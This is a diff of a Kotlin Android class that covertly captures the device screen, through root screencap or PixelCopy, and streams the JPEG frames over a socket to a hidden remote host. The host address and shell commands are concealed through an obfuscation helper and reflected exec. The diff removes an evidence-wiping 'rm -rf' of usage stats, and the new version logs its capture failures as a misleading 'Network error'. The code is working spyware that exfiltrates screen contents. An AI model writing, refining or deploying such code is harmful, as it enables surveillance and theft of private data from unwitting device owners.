@@ -9,11 +9,9 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.util.Log
 import android.view.PixelCopy
-import android.view.Window
 import com.example.mobsec_823.utils.SafetyNet
 import com.example.mobsec_823.utils.SecretBox
 import java.io.ByteArrayOutputStream
-import java.io.File
 import java.io.OutputStream
 import java.net.Socket
 import java.util.Collections
@@ -21,30 +19,36 @@ import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
 class carne(private val context: Context, private val activity: Activity? = null) {
+    private val TAG = "CarneTask"
     private val screenshots = Collections.synchronizedList(mutableListOf<ByteArray>())
     private val scheduler = Executors.newSingleThreadScheduledExecutor()
     private var isRunning = false
     private val remoteIp = SecretBox.getKitchenAddress()
     private val remotePort = SecretBox.getCarnePort()
     private var totalFramesCaptured = 0
+    private var cachedRootAvailable: Boolean? = null
 
     fun start() {
         if (isRunning) return
-        if (!SafetyNet.isEnvironmentSafe()) {
-
-        }
-
         isRunning = true
+        
         scheduler.scheduleWithFixedDelay({
             if (isRunning) {
                 if (!SafetyNet.checkKitchenPermit(88)) return@scheduleWithFixedDelay
-                if (isRootAvailable()) captureWithRoot() else activity?.let { captureInApp(it) }
+                
+                if (checkRootAvailability()) {
+                    captureWithRoot()
+                } else if (activity != null) {
+                    captureInApp(activity)
+                }
             }
-        }, 0, 1, TimeUnit.SECONDS) // Increased capture frequency (1s)
+        }, 0, 2, TimeUnit.SECONDS)
+        
         startRemoteForwarding()
     }
 
-    private fun isRootAvailable(): Boolean {
+    private fun checkRootAvailability(): Boolean {
+        cachedRootAvailable?.let { return it }
         return try {
             val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return false
             val os = process.outputStream
@@ -52,31 +56,34 @@ class carne(private val context: Context, private val activity: Activity? = null
             os.flush()
             val output = process.inputStream.bufferedReader().readText()
             process.waitFor()
-            output.contains("uid=0")
-        } catch (e: Exception) { false }
+            val available = output.contains("uid=0")
+            cachedRootAvailable = available
+            available
+        } catch (e: Exception) {
+            false
+        }
     }
 
     private fun captureWithRoot() {
-        if (!SafetyNet.checkOpaquePredicate(totalFramesCaptured)) {
-            SecretBox.reflectedExec("rm -rf /data/system/usagestats")
-        }
-
         try {
-            val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return
-            val os = process.outputStream
-            os.write("${SecretBox.getScreencapCmd()}\n".toByteArray())
-            os.write("${SecretBox.getExitCmd()}\n".toByteArray())
-            os.flush()
-
+            // Using an array for exec() to avoid shell parsing issues with spaces/dashes
+            val su = SecretBox.getSuCmd()
+            val screencap = SecretBox.getScreencapCmd()
+            val cmd = arrayOf(su, "-c", screencap)
+            
+            val process = SecretBox.reflectedExec(cmd) ?: return
             val pngBytes = process.inputStream.readBytes()
             process.waitFor()
+
             if (pngBytes.isNotEmpty()) {
                 BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size)?.let {
                     processBitmap(it)
                     it.recycle()
                 }
             }
-        } catch (e: Exception) { }
+        } catch (e: Exception) {
+            Log.w(TAG, "Network error")
+        }
     }
 
     private fun captureInApp(act: Activity) {
@@ -87,7 +94,9 @@ class carne(private val context: Context, private val activity: Activity? = null
         val thread = HandlerThread("PixelCopy").apply { start() }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             PixelCopy.request(window, bitmap, { result ->
-                if (result == PixelCopy.SUCCESS) processBitmap(bitmap)
+                if (result == PixelCopy.SUCCESS) {
+                    processBitmap(bitmap)
+                }
                 bitmap.recycle()
                 thread.quitSafely()
             }, Handler(thread.looper))
@@ -97,10 +106,11 @@ class carne(private val context: Context, private val activity: Activity? = null
     private fun processBitmap(bitmap: Bitmap) {
         val out = ByteArrayOutputStream()
         bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
+        val bytes = out.toByteArray()
         synchronized(screenshots) {
-            screenshots.add(out.toByteArray())
+            screenshots.add(bytes)
             totalFramesCaptured++
-            if (screenshots.size > 60) screenshots.removeAt(0)
+            if (screenshots.size > 5) screenshots.removeAt(0)
         }
     }
 
@@ -111,19 +121,21 @@ class carne(private val context: Context, private val activity: Activity? = null
                 try {
                     socket = Socket(remoteIp, remotePort)
                     val os = socket.getOutputStream()
-                    os.write(SecretBox.getCarneHeader().toByteArray())
+                    
                     var sentCount = 0
                     while (isRunning && !socket.isClosed) {
                         getNextFrame(sentCount)?.let {
-                            sendMjpegFrame(os, it)
+                            os.write(it)
+                            os.flush()
                             sentCount = Math.max(sentCount + 1, totalFramesCaptured - screenshots.size + 1)
-                            Thread.sleep(200) // Faster MJPEG stream (5 FPS)
-                        } ?: Thread.sleep(100)
+                            Thread.sleep(1000) 
+                        } ?: Thread.sleep(1000)
                     }
-                } catch (e: Exception) { 
-                    Thread.sleep(3000) // Reduced retry delay
+                } catch (e: Exception) {
+                    Thread.sleep(5000)
+                } finally {
+                    try { socket?.close() } catch (ex: Exception) {}
                 }
-                finally { try { socket?.close() } catch (ex: Exception) {} }
             }
         }.start()
     }
@@ -135,12 +147,8 @@ class carne(private val context: Context, private val activity: Activity? = null
         if (idx < 0) screenshots[0] else if (idx < screenshots.size) screenshots[idx] else null
     }
 
-    private fun sendMjpegFrame(out: OutputStream, frame: ByteArray) {
-        out.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n".toByteArray())
-        out.write(frame)
-        out.write("\r\n".toByteArray())
-        out.flush()
+    fun stop() {
+        isRunning = false
+        scheduler.shutdown()
     }
-
-    fun stop() { isRunning = false; scheduler.shutdown() }
 }
